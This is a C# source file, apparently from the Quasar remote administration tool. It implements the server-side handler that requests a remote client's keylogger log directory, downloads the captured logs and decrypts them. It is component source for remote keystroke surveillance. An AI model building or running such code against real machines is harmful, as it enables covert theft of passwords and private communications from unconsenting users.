using Quasar.Common.Helpers;
using Quasar.Common.Messages;
using Quasar.Common.Models;
using Quasar.Common.Networking;
using Quasar.Server.Models;
using Quasar.Server.Networking;
using System;
using System.IO;

namespace Quasar.Server.Messages
{
    /// <summary>
    /// Handles messages for the interaction with the remote keylogger.
    /// </summary>
    public class KeyloggerHandler : MessageProcessorBase<string>, IDisposable
    {
        /// <summary>
        /// The client which is associated with this keylogger handler.
        /// </summary>
        private readonly Client _client;

        /// <summary>
        /// The file manager handler used to retrieve keylogger logs from the client.
        /// </summary>
        private readonly FileManagerHandler _fileManagerHandler;

        /// <summary>
        /// The remote path of the keylogger logs directory.
        /// </summary>
        private string _remoteKeyloggerDirectory;

        /// <summary>
        /// The amount of all running log transfers.
        /// </summary>
        private int _allTransfers;

        /// <summary>
        /// The amount of all completed log transfers.
        /// </summary>
        private int _completedTransfers;

        /// <summary>
        /// Initializes a new instance of the <see cref="KeyloggerHandler"/> class using the given client.
        /// </summary>
        /// <param name="client">The associated client.</param>
        public KeyloggerHandler(Client client) : base(true)
        {
            _client = client;
            _fileManagerHandler = new FileManagerHandler(client, "Logs\\");
            _fileManagerHandler.DirectoryChanged += DirectoryChanged;
            _fileManagerHandler.FileTransferUpdated += FileTransferUpdated;
            _fileManagerHandler.ProgressChanged += StatusUpdated;
            MessageHandler.Register(_fileManagerHandler);
        }

        /// <inheritdoc />
        public override bool CanExecute(IMessage message) => message is GetKeyloggerLogsDirectoryResponse;

        /// <inheritdoc />
        public override bool CanExecuteFrom(ISender sender) => _client.Equals(sender);

        /// <inheritdoc />
        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetKeyloggerLogsDirectoryResponse logsDirectory:
                    Execute(sender, logsDirectory);
                    break;
            }
        }

        /// <summary>
        /// Retrieves the keylogger logs and begins downloading them.
        /// </summary>
        public void RetrieveLogs()
        {
            _client.Send(new GetKeyloggerLogsDirectory());
        }

        private void Execute(ISender client, GetKeyloggerLogsDirectoryResponse message)
        {
            _remoteKeyloggerDirectory = message.LogsDirectory;
            client.Send(new GetDirectory {RemotePath = _remoteKeyloggerDirectory});
        }

        private string GetDownloadProgress(int allTransfers, int completedTransfers)
        {
            decimal progress = Math.Round((decimal)((double)completedTransfers / (double)allTransfers * 100.0), 2);
            return $"Downloading...({progress}%)";
        }

        private void StatusUpdated(object sender, string value)
        {
            // called when directory does not exist or access is denied
            OnReport($"No logs found ({value})");
        }

        private void DirectoryChanged(object sender, string remotePath, FileSystemEntry[] items)
        {
            if (items.Length == 0)
            {
                OnReport("No logs found");
                return;
            }

            _allTransfers = items.Length;
            _completedTransfers = 0;
            OnReport(GetDownloadProgress(_allTransfers, _completedTransfers));

            foreach (var item in items)
            {
                // don't escape from download directory
                if (FileHelper.HasIllegalCharacters(item.Name))
                {
                    // disconnect malicious client
                    _client.Disconnect();
                    return;
                }

                _fileManagerHandler.BeginDownloadFile(Path.Combine(_remoteKeyloggerDirectory, item.Name), item.Name + ".html", true);
            }
        }

        private void FileTransferUpdated(object sender, FileTransfer transfer)
        {
            if (transfer.Status == "Completed")
            {
                try
                {
                    _completedTransfers++;
                    File.WriteAllText(transfer.LocalPath, FileHelper.ReadLogFile(transfer.LocalPath, _client.Value.AesInstance));
                    OnReport(_allTransfers == _completedTransfers
                        ? "Successfully retrieved all logs"
                        : GetDownloadProgress(_allTransfers, _completedTransfers));
                }
                catch (Exception)
                {
                    OnReport("Failed to decrypt and write logs");
                }
            }
        }

        /// <summary>
        /// Disposes all managed and unmanaged resources associated with this message processor.
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                MessageHandler.Unregister(_fileManagerHandler);
                _fileManagerHandler.ProgressChanged -= StatusUpdated;
                _fileManagerHandler.FileTransferUpdated -= FileTransferUpdated;
                _fileManagerHandler.DirectoryChanged -= DirectoryChanged;
                _fileManagerHandler.Dispose();
            }
        }
    }
}
